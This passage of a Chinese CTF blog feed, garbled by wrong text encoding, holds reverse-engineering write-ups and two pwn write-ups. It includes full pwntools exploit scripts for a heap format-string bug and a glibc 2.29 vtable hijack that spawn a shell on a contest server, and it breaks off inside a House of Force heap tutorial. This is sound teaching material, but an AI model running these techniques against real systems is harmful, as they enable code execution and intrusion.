alt></p><p>ç„¶åç”¨å·¥å…·åˆ é™¤å³å¯ï¼Œå…¶ä¸­0x97å°±æ˜¯<code>co_code</code></p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-variable"><span class="hljs-keyword">In</span></span> [<span class="hljs-number">12</span>]: <span class="hljs-function"><span class="hljs-title">len</span>(<span class="hljs-variable">code</span>.co_code)</span><span class="hljs-variable">Out</span>[<span class="hljs-number">12</span>]: <span class="hljs-number">151</span><span class="hljs-variable"><span class="hljs-keyword">In</span></span> [<span class="hljs-number">13</span>]: <span class="hljs-function"><span class="hljs-title">hex</span>(<span class="hljs-number">151</span>)</span><span class="hljs-variable">Out</span>[<span class="hljs-number">13</span>]: <span class="hljs-string">'0x97'</span></code></pre></div><p>æ‰€ä»¥å»é™¤è¿™8ä¸ªå­—èŠ‚çš„æ··æ·†ä»£ç ï¼Œç„¶åä¿®æ”¹<code>co_code</code>é•¿åº¦ä¸º<code>0x8f</code>ã€‚</p><h4 id="è¿˜åŸåçš„pycå¼€å¤´"><a href="#è¿˜åŸåçš„pycå¼€å¤´" class="headerlink" title="è¿˜åŸåçš„pycå¼€å¤´"></a>è¿˜åŸåçš„pycå¼€å¤´</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/imrvPr.png" srcset="/img/loading.gif" alt></p><h4 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h4><p>åç¼–è¯‘æ–¹æ³•å°±å¤šç§å¤šæ ·äº†ï¼Œå¯ä»¥åœ¨çº¿ä»€ä¹ˆçš„ï¼Œæˆ‘ä½¿ç”¨çš„<code>uncompyle6</code>.</p><div class="hljs"><pre><code class="hljs undefined">uncompyle6 -o <span class="hljs-number">1.</span>py <span class="hljs-number">1.</span>pyc</code></pre></div><div class="hljs"><pre><code class="hljs undefined"># uncompyle6 version <span class="hljs-number">3.7</span><span class="hljs-number">.1</span># Python bytecode <span class="hljs-number">2.7</span> (<span class="hljs-number">62211</span>)# Decompiled <span class="hljs-keyword">from</span>: Python <span class="hljs-number">2.7</span><span class="hljs-number">.16</span> (<span class="hljs-keyword">default</span>, Feb <span class="hljs-number">29</span> <span class="hljs-number">2020</span>, <span class="hljs-number">01</span>:<span class="hljs-number">55</span>:<span class="hljs-number">37</span>)# [GCC <span class="hljs-number">4.2</span><span class="hljs-number">.1</span> Compatible Apple LLVM <span class="hljs-number">11.0</span><span class="hljs-number">.3</span> (clang<span class="hljs-number">-1103.0</span><span class="hljs-number">.29</span><span class="hljs-number">.20</span>) (-macos10<span class="hljs-number">.15</span>-objc-# Embedded file name: pyCharm.py# Compiled at: <span class="hljs-number">2020</span><span class="hljs-number">-06</span><span class="hljs-number">-15</span> <span class="hljs-number">21</span>:<span class="hljs-number">23</span>:<span class="hljs-number">54</span><span class="hljs-keyword">import</span> base64a = <span class="hljs-string">'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM='</span>flag = raw_input(<span class="hljs-string">'Are u ready?'</span>)c = base64.b64encode(flag)d = list(c)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>):    d[i] += <span class="hljs-string">'a'</span>ohh = (<span class="hljs-string">''</span>).join(d)<span class="hljs-keyword">if</span> ohh == a:    print <span class="hljs-string">'great!waht u input is the flag u wanna get.'</span><span class="hljs-keyword">else</span>:    print <span class="hljs-string">'pity!'</span>%</code></pre></div><p>åç¼–è¯‘åè¿™é¢˜å°±ååˆ†ç®€å•äº†ã€‚</p><p>ç»™çš„å­—ç¬¦ä¸²æŠŠâ€œaâ€ï¼Œå»é™¤åè§£ç base64å³å¯ã€‚</p><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a><code>easy_maze</code></h3><p>ç›´æ¥å»hexä¸‹æå–è¿·å®«ï¼Œç”±äºæ˜¯100ä¸ªå­—ç¬¦ï¼Œå¾ˆå®¹æ˜“è”æƒ³åˆ°æ˜¯10x10çš„è¿·å®«ã€‚<br>ç„¶åä¸¢vscodeã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/Y7wdYy.png" srcset="/img/loading.gif" alt><br>ç›´æ¥è·¯å¾„å°±å‡ºæ¥äº†ã€‚</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attribute">jkkjjhjjkjjkkkuukukkuuhhhuukkk</span></code></pre></div><p>Md5ä¸€ä¸‹å³å¯ã€‚</p><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>é¢˜ç›®ä¸éš¾ï¼Œå¤ªèœäº†ï¼Œçœ‹c++æœ‰ç‚¹å¤´å¤§ï¼Œåšçš„æœ‰ç‚¹æ…¢ã€‚IdaåŠ¨æ€è°ƒè¯•ï¼Œä¸€å…±3ä¸ªcheckï¼Œéƒ½æ˜¯æ–­åœ¨<code>Strcmp</code>ã€‚æ¯æ¬¡éšä¾¿è¾“å…¥ï¼Œç„¶ååˆ†æå’Œè·å–rdiï¼Œrsiå¯„å­˜å™¨å¯¹åº”åœ°å€å¤„çš„å­—ç¬¦ä¸²ã€‚æ‹¿åˆ°ä»¥åï¼Œ3ä¸ªæ‹¼æ¥ä¸€ä¸‹å°±æ˜¯flagã€‚</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>è€ƒç‚¹å°±æ˜¯å †ä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ï¼ŒæŒºç®€å•çš„ã€‚</p><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p> åˆ©ç”¨ç¯å¢ƒå˜é‡é‚£æ¡é“¾ï¼Œè¿›è¡Œæ”»å‡»<code>ret address</code>ï¼Œä¿®æ”¹ä¸ºone gadget<br>ç»™äº†8æ¬¡æ¼æ´åˆ©ç”¨æœºä¼šï¼Œè¿˜æ˜¯å¾ˆå®¹æ˜“å®ç°çš„ã€‚å…¶ä¸­<code>ret address</code>ï¼Œä¸º<code>__libc_start_main+xxx</code></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./springboard'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10029</span>)    libc = ELF(remote_libc)elf = ELF(local_file)<span class="hljs-comment"># libc = elf.libc</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"1"</span>)sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"2"</span>)sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"3"</span>)sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"%13$pAAAA%11$p"</span>)sleep(<span class="hljs-number">0.1</span>)ru(<span class="hljs-string">"0x"</span>)tag = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xe0</span>ru(<span class="hljs-string">"AAAA0x"</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) <span class="hljs-number">-0x21b97</span>info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)key1 = hex(tag)[<span class="hljs-number">-4</span>:]print(key1)payload = <span class="hljs-string">'%&#123;&#125;c%13$hn'</span>.format(int(key1,<span class="hljs-number">16</span>))sla(<span class="hljs-string">"input"</span>,payload)sleep(<span class="hljs-number">5</span>)rec = rce18[<span class="hljs-number">1</span>] + libc_basekey2 = hex(rec)[<span class="hljs-number">-4</span>:]print(key2)payload = <span class="hljs-string">'%&#123;&#125;c%39$hn'</span>.format(int(key2,<span class="hljs-number">16</span>))sla(<span class="hljs-string">"input"</span>,payload)sleep(<span class="hljs-number">5</span>)key3 = int(hex(tag)[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>) + <span class="hljs-number">2</span>print(key3)payload = <span class="hljs-string">'%&#123;&#125;c%13$hhn'</span>.format(key3)sla(<span class="hljs-string">"input"</span>,payload)sleep(<span class="hljs-number">5</span>)key4 = hex(rec)[<span class="hljs-number">-6</span>:<span class="hljs-number">-4</span>]print(key4)payload = <span class="hljs-string">'%&#123;&#125;c%39$hhn'</span>.format(int(key4,<span class="hljs-number">16</span>))sla(<span class="hljs-string">"input"</span>,payload)itr()<span class="hljs-comment"># 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push   r15)</span><span class="hljs-comment"># 0008| 0x7fffffffe2f8 --&gt; 0x55554780</span><span class="hljs-comment"># 0016| 0x7fffffffe300 --&gt; 0x555555756010 ("11111111aaaaaaaa1111111122222222\n")</span><span class="hljs-comment"># 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00</span><span class="hljs-comment"># 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push   r15)</span><span class="hljs-comment"># 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)</span><span class="hljs-comment"># 0048| 0x7fffffffe320 --&gt; 0x1</span><span class="hljs-comment"># 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a ("/media/psf/mypwn/ahys/6/springboard/springboard")</span><span class="hljs-comment"># 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0</span><span class="hljs-comment"># 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push   rbp)</span><span class="hljs-comment"># 0080| 0x7fffffffe340 --&gt; 0x0</span><span class="hljs-comment"># 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42</span><span class="hljs-comment"># 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor    ebp,ebp)</span><span class="hljs-comment"># 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1</span><span class="hljs-comment"># 0112| 0x7fffffffe360 --&gt; 0x0</span><span class="hljs-comment"># 0120| 0x7fffffffe368 --&gt; 0x0</span><span class="hljs-comment"># 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42</span><span class="hljs-comment"># 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42</span><span class="hljs-comment"># 0144| 0x7fffffffe380 --&gt; 0x0</span><span class="hljs-comment"># 0152| 0x7fffffffe388 --&gt; 0x0</span><span class="hljs-comment"># 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830</span></code></pre></div><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>è€ƒç‚¹å°±æ˜¯<code>IO_FILE</code>çš„ç›¸å…³çŸ¥è¯†äº†ï¼Œæ˜¯é’ˆå¯¹ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹ã€‚</p><p>è¿™ä¸ªé¢˜ä¼°è®¡æ˜¯å‚è€ƒ<a href="https://xz.aliyun.com/t/7205" target="_blank" rel="noopener">https://xz.aliyun.com/t/7205</a>è¿™ä¸ªé¢˜å‡ºçš„ï¼Œä½†æ˜¯æ–‡ä¸­çš„é¢˜æ¯”è¿™ä¸ªè¦éš¾å¤šäº†ã€‚ï¼ˆpsï¼šæ„Ÿè°¢å‡ºé¢˜äººæ‰‹ä¸‹ç•™æƒ…ï¼‰</p><h4 id="fclose-å‡½æ•°è°ƒç”¨çš„-vtable-å‡½æ•°"><a href="#fclose-å‡½æ•°è°ƒç”¨çš„-vtable-å‡½æ•°" class="headerlink" title="fclose å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•°"></a>fclose å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•°</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/QSynPX.png" srcset="/img/loading.gif" alt></p><p>vtable å‡½æ•° æŒ‡é’ˆï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-comment">/* The 'finish' function does any final cleaning up of an _IO_FILE object.   It does not delete (free) it, but does everything else to finalize it.   It matches the streambuf::~streambuf virtual destructor.  */</span>typedef void (*_IO_finish_t) (FILE *, <span class="hljs-built_in">int</span>); <span class="hljs-comment">/* finalize */</span>#define <span class="hljs-constructor">_IO_FINISH(FP)</span> JUMP1 (__finish, FP, <span class="hljs-number">0</span>)#define <span class="hljs-constructor">_IO_WFINISH(FP)</span> WJUMP1 (__finish, FP, <span class="hljs-number">0</span>)<span class="hljs-keyword">struct</span> _IO_jump_t&#123;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">size_t</span>, <span class="hljs-params">__dummy</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">size_t</span>, <span class="hljs-params">__dummy2</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_finish_t</span>, <span class="hljs-params">__finish</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_overflow_t</span>, <span class="hljs-params">__overflow</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_underflow_t</span>, <span class="hljs-params">__underflow</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_underflow_t</span>, <span class="hljs-params">__uflow</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_pbackfail_t</span>, <span class="hljs-params">__pbackfail</span>)</span>;    <span class="hljs-comment">/* showmany */</span>    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_xsputn_t</span>, <span class="hljs-params">__xsputn</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_xsgetn_t</span>, <span class="hljs-params">__xsgetn</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seekoff_t</span>, <span class="hljs-params">__seekoff</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seekpos_t</span>, <span class="hljs-params">__seekpos</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_setbuf_t</span>, <span class="hljs-params">__setbuf</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_sync_t</span>, <span class="hljs-params">__sync</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_doallocate_t</span>, <span class="hljs-params">__doallocate</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_read_t</span>, <span class="hljs-params">__read</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_write_t</span>, <span class="hljs-params">__write</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_seek_t</span>, <span class="hljs-params">__seek</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_close_t</span>, <span class="hljs-params">__close</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_stat_t</span>, <span class="hljs-params">__stat</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_showmanyc_t</span>, <span class="hljs-params">__showmanyc</span>)</span>;    <span class="hljs-constructor">JUMP_FIELD(<span class="hljs-params">_IO_imbue_t</span>, <span class="hljs-params">__imbue</span>)</span>;&#125;;</code></pre></div><p>å¯¹äºæ”»å‡»çš„vtable å‡½æ•° æŒ‡é’ˆå…¶ä¸­çš„ï¼š</p><ul><li><code>__finish__</code></li><li><code>__close</code></li></ul><p>å…¶æ‰§è¡Œé¡ºåºæ˜¯å…ˆcloseï¼Œç„¶åfinishã€‚ç”±äºç¨‹åºç»™çš„æ˜¯0x18å­—èŠ‚çš„ä»»æ„å†™ï¼Œæ”»å‡» <code>__finish__</code>å°±å¯ä»¥äº†ã€‚</p><h4 id="libc2-29ä¸­çš„vtable"><a href="#libc2-29ä¸­çš„vtable" class="headerlink" title="libc2.29ä¸­çš„vtable"></a>libc2.29ä¸­çš„vtable</h4><p>vtableçš„å€¼ï¼Œä»¥åŠå…¶å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨glibc 2.29ä¸‹æ˜¯å¯å†™çš„ã€‚è¿™ä¸ªæ˜¯å¾ˆé‡è¦çš„ä¸€ç‚¹ï¼Œæœ¬æ¥ä¸ªäººä¸çŸ¥é“è¿™ä¸ªï¼Œæƒ³äº†å¥½ä¹…å…¶ä»–çš„åŠæ³•æ¥åˆ©ç”¨ã€‚</p><p><strong>åœ¨glibc 2.23ä»¥åŠglibc 2.27å…¶éƒ½æ˜¯ä¸å¯å†™çš„</strong>ã€‚</p><p>æ­£æ˜¯å› ä¸ºå¯ä»¥å†™ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜éš¾åº¦å°±é™ä½äº†å¾ˆå¤šã€‚</p><h4 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p>åˆ©ç”¨ç¨‹åºçš„æœ€åä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œç›´æ¥æŠŠ<code>__IO_2_1_stderrçš„vtable</code>ä¸Š<code>__finish__</code>æŒ‡é’ˆä¿®æ”¹ä¸ºone gadgetã€‚<br>ï¼ˆè¿™é‡Œçš„one gadgetï¼Œéœ€è¦è‡ªå·±å¤šè¯•ï¼‰ã€‚</p><h5 id="å°tips"><a href="#å°tips" class="headerlink" title="å°tips"></a>å°tips</h5><p>ç¬¬2æ¬¡çš„2å­—èŠ‚è¯»å…¥å¯ä»¥ç›´æ¥ç”¨å…¶æœ¬æ¥åœ°å€æœ«2å­—èŠ‚å³å¯ï¼Œç›´æ¥åœ¨<code>__IO_2_1_stderrçš„vtable</code>ä¸ç”¨è½¬ç§»ä¹Ÿå¯ä»¥çš„ã€‚ï¼ˆçœ‹åˆ°æœ‰åˆ«çš„å¸ˆå‚…è½¬ç§»åˆ°å…¶ä»–vtableåœ°å€çš„ã€‚ï¼‰å¹¶ä¸”ï¼Œç”±äºæ˜¯readå‡½æ•°ï¼Œç›´æ¥å‘ä¸ª<code>\x60</code>ä¸€ä¸ªå­—èŠ‚å³å¯ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./secret'</span>local_libc  = <span class="hljs-string">'/usr/lib/x86_64-linux-gnu/libc-2.29.so'</span>remote_libc = <span class="hljs-string">'./libc6_2.29-0ubuntu2_amd64.so'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10030</span>)    libc = ELF(remote_libc)elf = ELF(local_file)<span class="hljs-comment"># libc = elf.libc</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()ru(<span class="hljs-string">"0x"</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">"printf"</span>]info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)ru(<span class="hljs-string">"addr"</span>)vtable = <span class="hljs-number">0x1e5758</span> + libc_bases(p64(vtable))sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment"># debug()</span>s(<span class="hljs-string">'\x60'</span>)sleep(<span class="hljs-number">0.1</span>)rec = <span class="hljs-number">0xe2386</span> + libc_bases(p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)+p64(rec))itr()</code></pre></div><p>ç”±äºæå‰å°±<code>fclose(stdout)</code>,getshellä»¥åä¹Ÿä¸ä¼šæœ‰ä»»ä½•çš„è¾“å‡ºï¼Œæ‰€ä»¥å¾—ç”¨<code>exec 1&gt;&amp;2</code>æ¥æ¢å¤è¾“å‡ºã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Force</title>
    <link href="/2020/05/13/House%20of%20Force/"/>
    <url>/2020/05/13/House%20of%20Force/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åŸºæœ¬æŒ‰ç…§è¿™wikiä¸Šé¢å­¦çš„ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/J22cKM.png" srcset="/img/loading.gif" alt></p><h3 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h3><ul><li>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</li><li>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°<h3 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h3>House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼šè¿›è¡Œå †åˆ†é…æ—¶,å¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚,é‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚</li></ul><p>æ‰€ä»¥å½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆ?ç­”æ¡ˆæ˜¯,å¯ä»¥ä½¿å¾— top chunkæŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®,è¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-comment">// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°</span>victim = av-&gt;top;<span class="hljs-built_in">size</span>   = chunksize(victim);<span class="hljs-comment">// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚</span><span class="hljs-built_in">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (<span class="hljs-built_in">size</span>) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) &#123;    remainder_size = <span class="hljs-built_in">size</span> - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    <span class="hljs-keyword">void</span> *p = chunk2mem(victim);    alloc_perturb(p, bytes);    <span class="hljs-built_in">return</span> p;&#125;</code></pre></div><p>æ‰€ä»¥ï¼Œå¦‚æœå¯ä»¥ç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼,å°±å¯ä»¥è½»æ¾çš„é€šè¿‡è¿™ä¸ªéªŒè¯,è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿæ§åˆ¶top chunk size åŸŸçš„æ¼æ´ã€‚</p><h2 id="ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•"><a href="#ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•" class="headerlink" title="ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•"></a>ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/MW2ASE.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">remainder      = chunk<span class="hljs-constructor">_at_offset(<span class="hljs-params">victim</span>, <span class="hljs-params">nb</span>)</span>;av-&gt;top        = remainder;<span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span>#define chunk<span class="hljs-constructor">_at_offset(<span class="hljs-params">p</span>, <span class="hljs-params">s</span>)</span> ((mchunkptr)(((<span class="hljs-built_in">char</span> *) (p)) + 